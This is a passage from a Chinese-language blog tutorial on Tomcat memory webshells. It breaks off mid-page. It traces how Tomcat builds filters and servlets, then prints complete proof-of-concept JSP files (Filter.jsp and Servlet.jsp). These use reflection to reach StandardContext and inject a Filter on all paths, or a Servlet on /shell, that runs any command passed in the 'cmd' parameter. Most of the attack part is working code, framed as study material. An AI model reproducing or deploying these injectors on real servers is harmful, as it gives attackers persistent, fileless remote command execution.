class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (String urlPattern : urlPatterns) &#123;<br>                filterMap.addURLPattern(urlPattern);<span class="hljs-comment">//给urlPatterns属性赋值</span><br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (isMatchAfter) &#123;<br>                context.addFilterMap(filterMap);<span class="hljs-comment">//整合filterMap</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                context.addFilterMapBefore(filterMap);<span class="hljs-comment">//整合filterMap</span><br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>fileMap从filterDef中获取了<code>FilterName</code>属性，后续又赋值了<code>urlPatterns</code>,<code>dispatcherMapping</code></p><blockquote><p>可以看到<code>filterMaps</code>的组成部分<code>filterMap</code>的信息是从filterDef中获取</p></blockquote><p>经过上面的分析，我们可以总结出动态添加恶意Filter的思路</p><ol><li>获取StandardContext对象</li><li>创建恶意Filter</li><li>使用FilterDef对Filter进行封装，并添加必要的属性</li><li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li><li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li></ol><h4 id="完整POC-1"><a href="#完整POC-1" class="headerlink" title="完整POC"></a>完整POC</h4><p>Filter.jsp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br> <br>&lt;%<span class="hljs-comment">//获取StandardContext对象</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>%&gt;<br> <span class="hljs-comment">//恶意Filter，主要是doFilter方法</span><br>&lt;%! <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>            chain.doFilter(request, response);<br>        &#125;<br>    &#125;<br>%&gt;<br> <br>&lt;%<span class="hljs-comment">//使用FilterDef封装filter</span><br>    <span class="hljs-type">Shell_Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Filter</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;CommonFilter&quot;</span>;<br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilter(filter);<br>    filterDef.setFilterName(name);<br>    filterDef.setFilterClass(filter.getClass().getName());<br>    standardContext.addFilterDef(filterDef);<br> <span class="hljs-comment">//创建filterMap，filterMap用于路由映射</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setFilterName(name);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    standardContext.addFilterMapBefore(filterMap);<br> <span class="hljs-comment">//反射封装filterConfig及filterDef到filterConfigs </span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br> <br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);<br>    filterConfigs.put(name, filterConfig);<br>%&gt;<br></code></pre></td></tr></table></figure><p>先注册恶意Filter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/Java_Shell_war_exploded/Filter.jsp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010440959.png" alt="image-20230201044023838"></p><h3 id="Servlet型"><a href="#Servlet型" class="headerlink" title="Servlet型"></a>Servlet型</h3><p>先创建一个恶意Servlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> jakarta.servlet.*;<br><span class="hljs-keyword">import</span> jakarta.servlet.http.*;<br><span class="hljs-keyword">import</span> jakarta.servlet.annotation.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(name = &quot;Shell_Servlet&quot;, value = &quot;/shell&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125;<span class="hljs-keyword">catch</span> (IOException | NullPointerException e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010555517.png" alt="image-20230201055527413"></p><p>接着需要实现动态注册Servlet</p><h4 id="Servlet创建流程"><a href="#Servlet创建流程" class="headerlink" title="Servlet创建流程"></a>Servlet创建流程</h4><p>Servlet的生命周期分为如下五部分</p><ol><li>加载：当Tomcat第一次访问Servlet的时候，Tomcat会负责创建Servlet的实例</li><li>初始化：当Servlet被实例化后，Tomcat会调用<code>init()</code>方法初始化这个对象</li><li>处理服务：当浏览器访问Servlet的时候，Servlet 会调用<code>service()</code>方法处理请求</li><li>销毁：当Tomcat关闭时或者检测到Servlet要从Tomcat删除的时候会自动调用<code>destroy()</code>方法，让该实例释放掉所占的资源。一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁</li><li>卸载：当Servlet调用完<code>destroy()</code>方法后，等待垃圾回收。如果有需要再次使用这个Servlet，会重新调用<code>init()</code>方法进行初始化操作</li></ol><blockquote><p>Wrapper是对Servlet的抽象和包装，每个Context可以有多个Wrapper，Wrapper主要负责管理 Servlet ，包括的 Servlet 的装载、初始化、执行以及资源回收,也是接下来注册恶意Servlet的关键</p></blockquote><h4 id="创建StandardWrapper"><a href="#创建StandardWrapper" class="headerlink" title="创建StandardWrapper"></a>创建StandardWrapper</h4><p>在<code>StandardContext</code>#<code>startInternal</code>中，调用了<code>fireLifecycleEvent()</code>方法解析web.xml文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fireLifecycleEvent</span><span class="hljs-params">(String type, Object data)</span> &#123;<br>        <span class="hljs-type">LifecycleEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LifecycleEvent</span>(<span class="hljs-built_in">this</span>, type, data);<br>        <span class="hljs-keyword">for</span> (LifecycleListener listener : lifecycleListeners) &#123;<br>            listener.lifecycleEvent(event);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><blockquote><p>最终通过<code>ContextConfig#webConfig()</code>方法解析web.xml获取各种配置参数</p></blockquote><p>然后通过<code>configureContext(webXml)</code>方法创建StandWrapper对象，并根据解析参数初始化StandWrapper对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configureContext</span><span class="hljs-params">(WebXml webxml)</span> &#123;<br>        <span class="hljs-comment">// As far as possible, process in alphabetical order so it is easy to</span><br>        <span class="hljs-comment">// check everything is present</span><br>        <span class="hljs-comment">// Some validation depends on correct public ID</span><br>        context.setPublicId(webxml.getPublicId());<br> <br>...   <span class="hljs-comment">//设置StandardContext参数</span><br> <br>        <br>        <span class="hljs-keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;<br> <br>            <span class="hljs-comment">//创建StandardWrapper对象</span><br>            <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> context.createWrapper();<br> <br>            <span class="hljs-keyword">if</span> (servlet.getLoadOnStartup() != <span class="hljs-literal">null</span>) &#123;<br> <br>                <span class="hljs-comment">//设置LoadOnStartup属性</span><br>                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());<br>            &#125;<br>            <span class="hljs-keyword">if</span> (servlet.getEnabled() != <span class="hljs-literal">null</span>) &#123;<br>                wrapper.setEnabled(servlet.getEnabled().booleanValue());<br>            &#125;<br> <br>            <span class="hljs-comment">//设置ServletName属性</span><br>            wrapper.setName(servlet.getServletName());<br>            Map&lt;String,String&gt; params = servlet.getParameterMap();<br>            <span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;<br>                wrapper.addInitParameter(entry.getKey(), entry.getValue());<br>            &#125;<br>            wrapper.setRunAs(servlet.getRunAs());<br>            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();<br>            <span class="hljs-keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;<br>                wrapper.addSecurityReference(<br>                        roleRef.getName(), roleRef.getLink());<br>            &#125;<br> <br>            <span class="hljs-comment">//设置ServletClass属性</span><br>            wrapper.setServletClass(servlet.getServletClass());<br>            ...<br>            wrapper.setOverridable(servlet.isOverridable());<br> <br>            <span class="hljs-comment">//将包装好的StandWrapper添加进ContainerBase的children属性中</span><br>            context.addChild(wrapper);<br> <br>           <span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry :<br>                webxml.getServletMappings().entrySet()) &#123;<br>          <br>            <span class="hljs-comment">//添加路径映射</span><br>            context.addServletMappingDecoded(entry.getKey(), entry.getValue());<br>        &#125;<br>        &#125;<br>        ...<br>    &#125;<br></code></pre></td></tr></table></figure><p>最后通过<code>addServletMappingDecoded()</code>方法添加Servlet对应的url映射</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addServletMappingDecoded</span><span class="hljs-params">(String pattern, String name,</span><br><span class="hljs-params">                                  <span class="hljs-type">boolean</span> jspWildCard)</span> &#123;<br><span class="hljs-comment">//...</span><br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> (Wrapper) findChild(name);<br><span class="hljs-comment">//...</span><br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="加载StandWrapper"><a href="#加载StandWrapper" class="headerlink" title="加载StandWrapper"></a>加载StandWrapper</h4><p>接着在<code>StandardContext#startInternal</code>方法通过<code>findChildren()</code>获取<code>StandardWrapper</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Container child : findChildren()) &#123;<br>    <span class="hljs-keyword">if</span> (!child.getState().isAvailable()) &#123;<br>        child.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后依次加载完Listener、Filter后，就通过<code>loadOnStartUp()</code>方法加载wrapper</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">loadOnStartup</span><span class="hljs-params">(Container children[])</span> &#123;<br> <br>    <span class="hljs-comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span><br>    TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (Container child : children) &#123;<br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> (Wrapper) child;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">loadOnStartup</span> <span class="hljs-operator">=</span> wrapper.getLoadOnStartup();<br> <br>        <span class="hljs-comment">//判断属性loadOnStartup的值</span><br>        <span class="hljs-keyword">if</span> (loadOnStartup &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> Integer.valueOf(loadOnStartup);<br>        ArrayList&lt;Wrapper&gt; list = map.get(key);<br>        <span class="hljs-keyword">if</span> (list == <span class="hljs-literal">null</span>) &#123;<br>            list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>            map.put(key, list);<br>        &#125;<br>        list.add(wrapper);<br>    &#125;<br> <br>    <span class="hljs-comment">// Load the collected &quot;load on startup&quot; servlets</span><br>    <span class="hljs-keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;<br>        <span class="hljs-keyword">for</span> (Wrapper wrapper : list) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                wrapper.load();<span class="hljs-comment">//加载Servlet</span><br>            &#125;<br></code></pre></td></tr></table></figure><blockquote><p>最后的poc中需要注意<code>loadOnStartup</code>属性的设置，只有大于0才会被放入list，进而被加载<code>wrapper.load()</code></p></blockquote><h4 id="动态注册Servlet"><a href="#动态注册Servlet" class="headerlink" title="动态注册Servlet"></a>动态注册Servlet</h4><p>通过上面的分析可以总结流程</p><ol><li>获取<code>StandardContext</code>对象</li><li>编写恶意Servlet</li><li>通过<code>StandardContext.createWrapper()</code>创建<code>StandardWrapper</code>对象</li><li>设置<code>StandardWrapper</code>对象的<code>loadOnStartup</code>、<code>ServletName</code>、<code>ServletClass</code>属性值</li><li>将<code>StandardWrapper</code>对象添加进<code>StandardContext</code>对象的<code>children</code>属性中</li><li>通过<code>StandardContext.addServletMappingDecoded()</code>添加对应的路径映射</li></ol><h4 id="完整POC链"><a href="#完整POC链" class="headerlink" title="完整POC链"></a>完整POC链</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br>&lt;%<span class="hljs-comment">//得到StandardContext对象</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>%&gt;<br> <br>&lt;%!<br> <span class="hljs-comment">//恶意Servlet</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Servlet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br>    &#125;<br> <br>%&gt;<br> <br>&lt;%<span class="hljs-comment">//创建StandardWrapper并设置对应属性</span><br>    <span class="hljs-type">Shell_Servlet</span> <span class="hljs-variable">shell_servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Servlet</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> shell_servlet.getClass().getSimpleName();<br> <br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    wrapper.setLoadOnStartup(<span class="hljs-number">1</span>);<span class="hljs-comment">//不能小于0</span><br>    wrapper.setName(name);<br>    wrapper.setServlet(shell_servlet);<br>    wrapper.setServletClass(shell_servlet.getClass().getName());<br>%&gt;<br> <br>&lt;%<span class="hljs-comment">//绑定路由</span><br>    standardContext.addChild(wrapper);<br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,name);<br>%&gt;<br></code></pre></td></tr></table></figure><p>先注册Servlet</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost:8080/Java_Shell_war_exploded/Servlet.jsp<br></code></pre></td></tr></table></figure><p><img 